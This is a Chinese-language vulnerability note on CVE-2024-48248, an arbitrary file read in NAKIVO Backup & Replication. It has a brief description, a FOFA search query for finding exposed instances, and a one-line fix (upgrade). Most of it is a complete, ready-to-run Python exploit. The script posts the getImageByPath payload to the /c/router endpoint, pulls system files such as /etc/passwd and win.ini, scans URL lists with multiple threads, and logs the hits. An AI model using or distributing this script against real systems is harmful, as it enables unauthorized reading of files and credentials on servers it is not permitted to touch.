# 漏洞描述
NAKIVO Backup & Replication是一款专注于虚拟化、云端及混合环境的备份与灾难恢复的解决方案。近日官方修复 CVE-2024-48248 NAKIVO Backup & Replication任意文件读取漏洞，攻击者可利用STPreLoadManagement类中的getImageByPath方法，绕过路径验证并读取目标服务器上的任意文件。

# 披露时间
<font style="color:rgb(33, 37, 41);">2025-02-26</font>

# 参考链接
[https://avd.aliyun.com/detail?id=AVD-2024-48248&timestamp__1384=eqIxcDBD9ABQDODlxGrtDyDAx%2BiK4e3Nwdx](https://avd.aliyun.com/detail?id=AVD-2024-48248&timestamp__1384=eqIxcDBD9ABQDODlxGrtDyDAx%2BiK4e3Nwdx)

# fofa语法
app="NAKIVO-Backup-&-Replication"

# py脚本

```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-
import argparse
import requests
import re
import time
import random
import base64
import json
import concurrent.futures
import sys
import urllib3
from urllib.parse import urljoin, quote

# 禁用 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
timeout = 40  # 请求超时时间

def send_post_request(url, file, proxies={}):
    headers = {"Content-type": "application/json", "Accept-Encoding": "gzip, deflate, br"}
    payload = {
        "action": "STPreLoadManagement",
        "data": [file],
        "method": "getImageByPath",
        "sid": "",
        "tid": "watchTowr",
        "type": "watchTowr"
    }
    try:
        response = requests.post(f"{url}/c/router", headers=headers, json=payload, verify=False, proxies=proxies, timeout=timeout)
        response.raise_for_status()  # 检查HTTP错误
        return response
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed for URL '{url}' and file '{file}': {e}")
        return None

# 解码文件内容
def decode_file_content(response):
    try:
        parsed_json = response.json()
        data_array = parsed_json.get('data', [])
        return ''.join(chr(num) for num in data_array) if data_array else None
    except (json.JSONDecodeError, KeyError) as e:
        print(f"[!] Error parsing response: {e}")
        return None


def verify(url, proxies={}):
    if not url.startswith(('http://', 'https://')):
        # 如果没有，就添加 'http://'
        url = 'http://' + url

    files_to_read = ["C:/windows/win.ini", "/etc/passwd"]  # 需要读取的文件

    for file in files_to_read:
        print(f"[*] Attempting to read file '{file}'")
        response = send_post_request(url, file, proxies)

        if response and "NoSuchFileException" in response.text:
            print(f"[!] Error: NoSuchFileException for file '{file}'")
            continue
        if response:
            content = decode_file_content(response)
            if content:
                print('\033[1;31m' + '[+] Success ' + url + '\033[0m')
                with open('CVE-2024-48248.txt', 'a') as f:
                    f.write(url + '\n' + file + content + '\n\n')


def pl(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url:
                    yield url
    except Exception as e:
        print(f"[-] Error reading file {filename}: {e}")

def main():
    # helpinfo = """ """
    # print(helpinfo)
    parser = argparse.ArgumentParser(description='CVE-2024-48248.txt')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
    parser.add_argument('-t', '--thread', type=int, help='线程，默认为10')
    parser.add_argument('-p', '--proxies', type=str, help='代理设置，如 http://127.0.0.1:8080')
    args = parser.parse_args()

    proxies = {}
    if args.proxies:
        proxies = {'http': args.proxies, 'https': args.proxies}

    if args.url:
        verify(args.url, proxies=proxies)
    elif args.file:
        urls = pl(args.file)
        thread = 10
        if args.thread:
            thread = args.thread
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(lambda url: verify(url, proxies=proxies), urls)

if __name__ == '__main__':
    main()
```

# 修复建议
升级至最新版本。

